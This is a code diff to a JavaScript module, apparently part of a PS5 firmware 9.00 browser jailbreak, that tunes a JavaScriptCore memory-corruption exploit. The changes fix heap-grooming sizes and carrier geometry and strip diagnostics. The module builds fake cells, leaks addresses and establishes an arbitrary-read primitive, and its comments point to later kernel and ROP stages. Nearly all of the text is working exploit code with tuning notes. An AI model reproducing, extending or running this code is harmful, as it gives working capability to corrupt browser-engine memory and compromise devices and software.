@@ -1,4 +1,4 @@
-let DRAIN_COUNT = 512;
+const DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
 
 const K = 2;
@@ -6,50 +6,33 @@ const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
 const CONTROL_INT = -64000;
 const FILLER_BIGINTS = K - 1;
-const FILLER_OBJECTS = 0x200000 - K;
+const FILLER_OBJECTS = 0xfffe - K;
 const EXPECTED_LENGTH = 0x50001;
 const CELL_BYTES = 0x30;
 const FUNCTION_BYTES = 0x20;
 const NATIVE_EXECUTABLE_BYTES = 0x38;
 const HOLDER_BYTES = 0x40;
 
-const CARRIER_SLOTS = (function () {
-    try {
-        const q = new URLSearchParams(location.search).get("slots");
-        const n = q ? parseInt(q, 10) : 0;
-        if (n >= 100000 && n <= 12000000) return n;
-    } catch (e) { }
-    return 9000000;
-})();
+// 9.00 copies 924,176 UTF-16 characters from this backing store (~1.85 MB).
+// This capacity is part of the 9.00 JSC exploit geometry, not merely spare
+// storage.  At 9,000,000 slots the corrupted Symbol copy is consistently
+// 924,176 characters.  Reducing it to 2,000,000 changes that copy to a bogus
+// 17,701,392 characters and makes the safe retry exhaust the WebProcess.
+const CARRIER_SLOTS = 9000000;
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
 const COMPOSE_DELAY_MS = 100;
 
 const symbolToString = Symbol.prototype.toString;
 
-const _gOverride = (function () {
-    const out = {};
-    try {
-        const q = new URLSearchParams(location.search).getAll("g");
-        for (const item of q) {
-            const [k, v] = item.split(":");
-            const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
-            if (k && n > 0) out[k] = n;
-        }
-    } catch (e) { }
-    return out;
-})();
-const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[name] : dflt);
-if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
-
-const DRAIN_SIZE = _g("drainsz", 0x10000);
-const SLAB_SIZE = _g("slab", 0x400000);
-const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
-const SEPARATOR_SIZE = _g("sep", 0x10000);
-const EARLY_HOLE_SIZE = _g("early", 0x70000);
-const GUARD_SIZE = _g("guard", 0x90000);
-const PREDECESSOR_SIZE = _g("pred", 0x80000);
-const FINAL_HOLE_SIZE = _g("final", 0x80000);
+const DRAIN_SIZE = 0x10000;
+const SLAB_SIZE = 0x400000;
+const BUTTERFLY_HOLE_SIZE = 0x81000;
+const SEPARATOR_SIZE = 0x10000;
+const EARLY_HOLE_SIZE = 0x70000;
+const GUARD_SIZE = 0x90000;
+const PREDECESSOR_SIZE = 0x80000;
+const FINAL_HOLE_SIZE = 0x80000;
 
 const RW_BUFFER_SIZE = 0x100;
 
@@ -58,7 +41,7 @@ const IDENT_OFFSET = 0x20;
 const LEAK_SLOT_INDEX = 2;
 const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;
 
-const REVISION = "slopkit-core-1";
+const REVISION = "slopkit-core-final";
 const attemptKey = `${REVISION}:attempts`;
 
 const burstKey = `${REVISION}:burst`;
@@ -66,7 +49,6 @@ const burstKey = `${REVISION}:burst`;
 const rwHeader = new Uint8Array(CELL_BYTES);
 const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
 const holderHeader = new Uint8Array(HOLDER_BYTES);
-const probeHeader = new Uint8Array(0x20);
 const scratchBits = new ArrayBuffer(8);
 const scratchBytes = new Uint8Array(scratchBits);
 const scratchWords = new Uint32Array(scratchBits);
@@ -260,10 +242,10 @@ function plausibleCell(value) {
 }
 
 function plausibleAddress(value) {
-    if (!Number.isFinite(value) || Math.floor(value) !== value) return false;
-    if (value > 0x100000000 && value <= 0xffffffffffff) return true;
-    if (value >= 0xffffffff80000000) return true;
-    return false;
+    return value > 0x100000000
+        && value <= 0xffffffffffff
+        && value <= 9007199254740991
+        && Math.floor(value) === value;
 }
 
 function canonicalLow48(bytes, offset) {
@@ -286,51 +268,11 @@ function encodedHeaderNumber() {
     return f64[0];
 }
 
-// Read 0x20 bytes at `addr` through `candidate` into `probeHeader`,
-// then restore the carrier. `candidate` must be the live fake cell.
-function probeMemoryAt(candidate, addr) {
-    if (!plausibleAddress(addr) || addr % 8 !== 0) return false;
-    try {
-        aimCarrier(candidate, addr);
-        readBytes(probeHeader, rwView, 0x20);
-        restoreCarrier(candidate);
-        return true;
-    } catch (e) {
-        console.warn("[core] probeMemoryAt threw:", e);
-        try { restoreCarrier(candidate); } catch (e2) { }
-        return false;
-    }
-}
-
-// Diagnostic only. Never gates the chain. Called with the live candidate
-// and the address we believe is a JSFunction.
-function looksLikeJSFunction(candidate, addr) {
-    if (!plausibleAddress(addr) || addr % 8 !== 0) return false;
-    if (!probeMemoryAt(candidate, addr)) return false;
-
-    const blk = probeHeader;
-    const sid = blk[0] | (blk[1] << 8) | (blk[2] << 16) | (blk[3] << 24);
-    if (sid < 0x100 || sid >= 0x08000000) return false;
-    if (blk[4] !== 0) return false;
-    if (blk[7] !== 0 && blk[7] !== 1) return false;
-
-    // Butterfly may be zero on builtins without FunctionRareData.
-    const bflyLo = blk[8] | (blk[9] << 8) | (blk[10] << 16) | (blk[11] << 24);
-    const bflyHi = blk[12] | (blk[13] << 8) | (blk[14] << 16) | (blk[15] << 24);
-    if (bflyHi !== 0) return false;
-    if (bflyLo !== 0 && bflyLo % 8 !== 0) return false;
-
-    return true;
-}
-
 function emit(tag, detail) {
     if (onEvent === null)
         return;
-    try {
-        onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
-    } catch (err) {
-        try { console.warn("[core.emit] handler threw:", err); } catch { }
-    }
+    try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); }
+    catch {  }
 }
 
 function checkCarrierIdentity(candidate) {
@@ -361,13 +303,8 @@ function giveUp(reason) {
     settleResolve = null;
     settleReject = null;
     running = false;
-    if (reject !== null) {
-        try {
-            reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
-        } catch (err) {
-            console.warn("[core.giveUp] reject threw:", err);
-        }
-    }
+    if (reject !== null)
+        reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
 }
 
 function failed() {
@@ -379,15 +316,15 @@ function failed() {
     stopped = false;
     retryScheduled = false;
     setTimeout(() => {
-        try { history.replaceState(null, ""); }
-        catch (e) { console.warn("[core.failed] history reset threw:", e); }
+        try { history.replaceState(null, ""); } catch { }
         attemptNumber++;
         startAttempt();
     }, AUTO_RETRY_DELAY_MS);
 }
 
 function releaseAttemptAllocations() {
-
+    // Drop the safe attempt before the retry timer so JSC gets an idle turn to
+    // reclaim it instead of overlapping two carrier/string/SSV graphs.
     referenceTarget = null;
     rwBuffer = null;
     rwView = null;
@@ -411,11 +348,9 @@ function releaseAttemptAllocations() {
     capturedWords = null;
     predecessorWords = null;
     keepAlive = null;
-    try { history.replaceState(null, ""); }
-    catch (e) { console.warn("[core.releaseAttemptAllocations] history reset threw:", e); }
+    try { history.replaceState(null, ""); } catch { }
     if (typeof globalThis.gc === "function") {
-        try { globalThis.gc(); }
-        catch (e) { console.warn("[core] gc() threw:", e); }
+        try { globalThis.gc(); } catch { }
     }
 }
 
@@ -536,7 +471,6 @@ function resetAttemptState() {
     rwHeader.fill(0);
     targetHeader.fill(0);
     holderHeader.fill(0);
-    probeHeader.fill(0);
 }
 
 function startAttempt() {
@@ -550,7 +484,7 @@ function startAttempt() {
         sessionStorage.setItem(attemptKey, String(attemptNumber));
         attemptPersisted = sessionStorage.getItem(attemptKey)
             === String(attemptNumber);
-    } catch (e) { console.warn("[core] sessionStorage probe threw:", e); }
+    } catch { }
     emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
         + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
     try {
@@ -647,17 +581,15 @@ function buildAndStoreGraph() {
     buildFakeHost();
 
     emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
-    fillerGraph = new Array(0x200000);
+    fillerGraph = new Array(0xfffd);
     let pos = 0;
-    
+    const huge = 1n << 40n;
     for (let b = 0; b < FILLER_BIGINTS; ++b)
-        fillerGraph[pos++] = 0x7fffffff + b;
-        
+        fillerGraph[pos++] = huge + BigInt(b);
     for (let o = 0; o < FILLER_OBJECTS; ++o)
         fillerGraph[pos++] = {};
 
-    outerGraph = new Array(EXPECTED_LENGTH).fill(null);
-
+    outerGraph = new Array(CONTROL_INDEX + 1);
     outerGraph[0] = fillerGraph;
     outerGraph[1] = referenceTarget;
     outerGraph[2] = referenceTarget;
@@ -695,12 +627,6 @@ function runAddrofCapture() {
         copiedLength = capturedString.length;
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
-
-        leakedScope = null;
-        getterCarrier = null;
-        preparedSymbolObject = null;
-        capturedString = null;
-
         captureState = 1;
     } catch (error) {
         captureError = error;
@@ -779,16 +705,13 @@ function loadHistoryCritical() {
         const rwLength = uint32At(rwHeader, 0x18);
         rwOriginalVector = low48At(rwHeader, 0x10);
 
-        const rwTailByte = rwHeader[0x20];
-        const rwOffsetZero = allZero(rwHeader, 0x21, 0x28)
-            && (rwTailByte === 0 || rwTailByte === 2);
+        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
 
         profile.carrierSID = rwSID;
         profile.carrierType = rwHeader[5];
         profile.carrierFlags = rwHeader[6];
         profile.carrierMode = rwHeader[0x1c];
         profile.carrierByte28 = rwHeader[0x28];
-        profile.carrierByte20 = rwHeader[0x20];
 
         rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
             && rwHeader[4] === 0
@@ -901,12 +824,6 @@ function loadHistoryCritical() {
             return;
         }
 
-        if (!looksLikeJSFunction(candidate, nativeTargetAddress)) {
-            emit("FUNC-HEADER-WEAK",
-                `addr=${hex(nativeTargetAddress)}`
-                + `-bytes=${dumpHex(holderHeader, HOLDER_BYTES)}`);
-        }
-
         aimCarrier(candidate, nativeTargetAddress);
         readBytes(targetHeader, rwView, FUNCTION_BYTES);
 
@@ -918,14 +835,6 @@ function loadHistoryCritical() {
         profile.functionType = targetHeader[5];
         profile.functionFlags = targetHeader[6];
         const functionType1 = targetHeader[5];
-        const butterflyOK = functionButterfly === 0
-            || (functionButterfly > 0x100000000
-                && functionButterfly <= 0xffffffffffff
-                && functionButterfly % 8 === 0);
-        const scopeOK = functionScope === 0
-            || (functionScope > 0x100000000
-                && functionScope <= 0xffffffffffff
-                && functionScope % 8 === 0);
         functionHeaderOK = functionStructureID >= 0x100
             && functionStructureID < 0x08000000
             && nativeTargetAddress % 0x10 === 0
@@ -934,8 +843,12 @@ function loadHistoryCritical() {
             && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
             && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
             && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
-            && butterflyOK
-            && scopeOK
+            && functionButterfly > 0x100000000
+            && functionButterfly <= 0xffffffffffff
+            && functionButterfly % 8 === 0
+            && functionScope > 0x100000000
+            && functionScope <= 0xffffffffffff
+            && functionScope % 8 === 0
             && executableAddress > 0x100000000
             && executableAddress <= 0xffffffffffff
             && executableAddress % 0x10 === 0
@@ -959,7 +872,8 @@ function loadHistoryCritical() {
         profile.nativeExecSID = nativeExecutableStructureID;
         profile.nativeExecType = targetHeader[5];
         profile.nativeExecFlags = targetHeader[6];
-
+        // 9.00+ resolves webkitBase from this instead of a vtable rva
+        try { globalThis.__ps5NativeCtor = nativeConstructorAddress; } catch (e) { }
         const nativeExecType1 = targetHeader[5];
 
         nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x100
@@ -1008,30 +922,21 @@ function loadHistoryCritical() {
         liveCandidate = candidate;
         candidate = null;
         clearPredecessor();
-
-        try { history.replaceState(null, ""); }
-        catch (e) { console.warn("[core] history drop threw:", e); }
-
         compositionState = 1;
     } catch (error) {
         retrySafe = candidate === null && result === null
             && !rwHeaderCaptured && error?.name === "TypeError";
         if (result !== null) {
-            try { result[DUPLICATE_INDEX] = undefined; }
-            catch (e) { console.warn("[core] result cleanup threw:", e); }
+            try { result[DUPLICATE_INDEX] = undefined; } catch { }
         }
         if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
-            try { restoreCarrier(candidate); }
-            catch (e) { console.warn("[core] restoreCarrier in catch threw:", e); }
+            try { restoreCarrier(candidate); } catch { }
         }
         candidate = null;
         result = null;
-        try { targetView[0] = 0xa5; }
-        catch (e) { console.warn("[core] targetView reset threw:", e); }
-        try { rwMirror[0] = 0x3c; }
-        catch (e) { console.warn("[core] rwMirror reset threw:", e); }
-        try { clearPredecessor(); }
-        catch (e) { console.warn("[core] clearPredecessor threw:", e); }
+        try { targetView[0] = 0xa5; } catch { }
+        try { rwMirror[0] = 0x3c; } catch { }
+        try { clearPredecessor(); } catch { }
         compositionError = error;
         compositionState = -1;
     }
@@ -1041,15 +946,14 @@ function runGroomAndLoad() {
     try {
         emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
         const channel = new MessageChannel();
+        channel.port1.close();
+        channel.port2.close();
 
         for (let i = 0; i < DRAIN_COUNT; ++i)
             keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
 
         let slab = buffer(SLAB_SIZE);
         channel.port1.postMessage(0, [slab]);
-        if (slab.byteLength !== 0) {
-            emit("TRANSFER-NOOP", "slab byteLength=" + slab.byteLength);
-        }
         slab = null;
 
         const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
@@ -1057,15 +961,13 @@ function runGroomAndLoad() {
         const separator = buffer(SEPARATOR_SIZE);
         const earlyHole = buffer(EARLY_HOLE_SIZE);
         const guard = buffer(GUARD_SIZE);
+        const predecessor = buffer(PREDECESSOR_SIZE);
         const finalHole = buffer(FINAL_HOLE_SIZE);
 
-        let predecessor = buffer(PREDECESSOR_SIZE);
         fillRawCellPointers(predecessor, fakeAddress);
-
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
         keepAlive[keepIndex++] = predecessor;
-
         emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
             + `-fake=${hex(fakeAddress)}`);
 
@@ -1073,22 +975,9 @@ function runGroomAndLoad() {
 
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
-        if (butterflyHole1.byteLength !== 0 || butterflyHole2.byteLength !== 0
-            || earlyHole.byteLength !== 0 || finalHole.byteLength !== 0) {
-            emit("TRANSFER-NOOP-2",
-                "holes byteLength=" + butterflyHole1.byteLength
-                + "," + butterflyHole2.byteLength
-                + "," + earlyHole.byteLength
-                + "," + finalHole.byteLength);
-        }
-
-        channel.port1.close();
-        channel.port2.close();
-
         loadHistoryCritical();
     } catch (error) {
-        try { clearPredecessor(); }
-        catch (e) { console.warn("[core] clearPredecessor on groom fail threw:", e); }
+        try { clearPredecessor(); } catch {}
         retrySafe = true;
         compositionError = error;
         compositionState = -1;
@@ -1105,21 +994,10 @@ function ensureBarrierNode() {
         barrierNode = document.createElement("div");
         barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
         document.body.appendChild(barrierNode);
-    } catch (e) {
-        console.warn("[core] barrier node create threw:", e);
-        barrierNode = null;
-    }
+    } catch { barrierNode = null; }
 }
 
 function defaultCriticalBarrier(fake, target) {
-    const t = [];
-    for (let i = 0; i < 4; ++i) t.push({});
-    t.length = 0;
-
-    emit("BARRIER-FIRED", "fake=" + hex(fake)
-        + " target=" + hex(target)
-        + " t=" + (typeof performance !== "undefined"
-                   ? performance.now().toFixed(1) : "?"));
     try {
         const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
         if (barrierNode !== null) {
@@ -1127,9 +1005,9 @@ function defaultCriticalBarrier(fake, target) {
             void barrierNode.offsetWidth;
         }
         void new Blob([line], { type: "text/plain" });
-        try { sessionStorage.setItem(burstKey, line); }
-        catch (e) { console.warn("[core] burst write threw:", e); }
-    } catch (e) { console.warn("[core.barrier] marker threw:", e); }
+
+        try { sessionStorage.setItem(burstKey, line); } catch { }
+    } catch { }
 }
 
 function beginComposition() {
@@ -1276,15 +1154,15 @@ function reportComposition() {
     emit("READ-PRIMITIVE-PASS", "arbitrary-read-established"
         + "-firmware-offsets-asserted=none");
 
+    try { history.replaceState(null, ""); } catch { }
+
     stopped = true;
     running = false;
     const resolve = settleResolve;
     settleResolve = null;
     settleReject = null;
-    if (resolve !== null) {
-        try { resolve(buildCarrier()); }
-        catch (e) { console.warn("[core] resolve threw:", e); }
-    }
+    if (resolve !== null)
+        resolve(buildCarrier());
 }
 
 function buildCarrier() {
@@ -1365,8 +1243,7 @@ export function establishPrimitive(options) {
     running = true;
     stopped = false;
     attemptNumber = 1;
-    try { sessionStorage.removeItem(attemptKey); }
-    catch (e) { console.warn("[core] sessionStorage clear threw:", e); }
+    try { sessionStorage.removeItem(attemptKey); } catch { }
 
     return new Promise((resolve, reject) => {
         settleResolve = resolve;
@@ -1415,18 +1292,15 @@ export function releaseFakeCell() {
     referenceTarget = null;
     keepAlive = null;
 
+    // The serialized exploit graph otherwise remains owned by the current
+    // history entry after all JavaScript bindings are dropped.  It is no
+    // longer needed once mem.js has promoted the primitive to the real-cell
+    // pair, and retaining it can push the PS5 WebProcess over its heap limit
+    // when the kernel stages begin allocating their worker/ROP arenas.
     try {
         history.replaceState(null, "");
         report.historyCleared = history.state === null;
-    } catch (e) { console.warn("[core.releaseFakeCell] history reset threw:", e); }
-
-    const reject = settleReject;
-    settleResolve = null;
-    settleReject = null;
-    if (reject !== null) {
-        try { reject(new Error("core: released before primitive resolved")); }
-        catch (e) { console.warn("[core] releaseFakeCell late reject threw:", e); }
-    }
+    } catch (_) { }
 
     fakeReleased = true;
     stopped = true;
